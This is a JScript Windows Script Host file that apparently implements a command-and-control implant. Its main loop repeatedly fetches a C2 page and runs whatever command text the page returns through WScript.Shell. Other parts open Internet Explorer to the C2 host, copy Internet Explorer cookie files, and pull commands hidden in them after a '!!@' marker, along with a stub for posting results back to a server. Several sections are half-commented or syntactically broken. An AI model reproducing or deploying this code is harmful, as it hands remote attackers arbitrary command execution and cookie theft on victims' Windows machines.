/*
<%@ language="JScript" %>
import System;
import System.ServiceProcess;
import System.Diagnostics;
import System.Timers;
import System.Net;
import System.IO;
*/

//Invoke-IE
var c2url = "http://ssppayments.com:9000"

var initcmd = "";
//Gobble Gobble History Files


// Import the required .NET namespaces.
/*
var x2Http = new ActiveXObject("Microsoft.XMLHTTP");
var bStrm = new ActiveXObject("Adodb.Stream");
x2Http.Open("GET", "http://localhost/c2.html", 0);
x2Http.Send()
bStrm.write xHttp.responseBody;
*/
//Set objFile = objFSO.OpenTextFile( strFile, ForWriting, True )


//  Return the response text.
/*
var client = new system.net.WebClient ();
var res = client.OpenRead ("http://localhost/c2.html");
WScript.Echo(res);


/*
WebClient client = new WebClient ();

// Add a user agent header in case the
// requested URI contains a query.

client.Headers.Add ("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");

Stream data =
StreamReader reader = new StreamReader (data);
string s = reader.ReadToEnd ();
Console.WriteLine (s);
data.Close ();
*/


//#######################
//   FUNCTIONS
//#######################
function webRequest(target) {

  var res;
  try
  {
    var WinHttpReq = new ActiveXObject( "WinHttp.WinHttpRequest.5.1" );

    WinHttpReq.Open("GET", target, false);
    //  Send the HTTP request.
    WinHttpReq.Send();
    // Wait for the entire response.
    WinHttpReq.WaitForResponse();
    //  Retrieve the response text.

    res = WinHttpReq.ResponseText;
  }
  catch (objError)
  {
    res = objError + "\n"
    res += "WinHTTP returned error: " +
        (objError.number & 0xFFFF).toString() + "\n\n";
    res += objError.description;
  }

  return res;
}

function browserInject() {
  //Load React-Gryffindor into the browser's homepage and instantiate
  //var c2url = "http://10.0.0.189/";
  var ieShell = new ActiveXObject("WScript.Shell");
  //ieShell.Run("C:\\Program Files\\Internet Explorer\\iexplore.exe");
  ieShell.Run("\"C:\\Program Files\\Internet Explorer\\IExplore.exe\"" + c2url, 2);
  WScript.Sleep(3000);
}


/*
function webPost($target, $retval) {
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$wc = new-object system.net.WebClient
$response = new-object System.Collections.Specialized.NameValueCollection
$response.Add("return", $retval)
$webpage = $wc.UploadString($target, $response)
}

function md5sum($data) {
   $md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
   $utf8 = new-object -TypeName System.Text.UTF8Encoding
   $hash = [System.BitConverter]::ToString($md5.ComputeHash($utf8.GetBytes($data)))
   return $hash
}
*/

//#######################
//   MAIN EXECUTION
//#######################

var curcmd = "";
var serverMsg = "";
var target = "http://localhost/c2.html";
//var target = "http://ssppayments.com/c2.html";
//var data = webRequest(target);
var objShell = new ActiveXObject("WScript.Shell");

while(true)
{

  var serverMsg = webRequest(target);

  if (curcmd != serverMsg) {
    objShell.Run(serverMsg);
    curcmd = serverMsg;
  }
  WScript.Sleep(3000);
}


/*



  var objShell = new ActiveXObject("WScript.Shell");
  //objShell.Run("dir C:\\Users\\0zm0s1z\\Appdata\\Local\\Microsoft\\Windows\\INetCookies\\U512KHAM.cookie");
  //var rawCookie = "C:\\Users\\0zm0s1z\\Appdata\\Local\\Microsoft\\Windows\\INetCookies\\";
  //var rawCookie = "C:/Users/0zm0s1z/Appdata/Local/Microsoft/Windows/INetCookies/U512KHAM.cookie";
  //var rawCookie = "C:\\world.txt"
  //copy C:\\Users\\0zm0s1z\\Appdata\\Local\\Microsoft\\Windows\\INetCookies\\*.cookie .\\newcookie.txt

  //objShell.Run("cmd /C copy C:\\Users\\0zm0s1z\\Appdata\\Local\\Microsoft\\Windows\\INetCookies\\*.cookie .\\newcookie.txt");
  objShell.Run("cmd /C copy C:\\Users\\0zm0s1z\\Appdata\\Local\\Microsoft\\Windows\\INetCookies\\*.cookie .\\newcookie.txt", 0);

  WScript.Sleep(3000);
  var rawCookie = "newcookie.txt"

  var forReading = 1, forWriting = 2, forAppending = 8;
  rline = new Array();
  fs = new ActiveXObject("Scripting.FileSystemObject");
  f =  fs.GetFile(rawCookie);
  is = f.OpenAsTextStream( forReading, 0 );



  var count = 0;
  while( !is.AtEndOfStream ){
     rline[count] = is.ReadLine();
     count++;
  }
  // Close the stream
  is.Close();
  // Place the contents of the array into
  // a variable.
  var commands = "";
  for(i = 0; i < rline.length; i++){
      commands += rline[i] + "\n";
  }
  cmder = commands.split("!!@")[1];

  // Exec the command
  // If new
  if (initcmd != cmder){
    var cmderShell = new ActiveXObject("WScript.Shell");
    try {
      //Replace with eval line when REACTBOT can act as ctrler
      cmderShell.Run(cmder);
    }
    catch (e) {
      WScript.Echo("Something went wrong attempting to execute the command: ", commands.split("!!@")[1]);
    }
    initcmd = cmder;
  }

  WScript.Sleep(1000);
}
/*
while(true)
{
  var objShell = new ActiveXObject("WScript.Shell");
  objShell.Run("%windir%\notepad C:\world.txt");
  WScript.Sleep(3000);
}*/
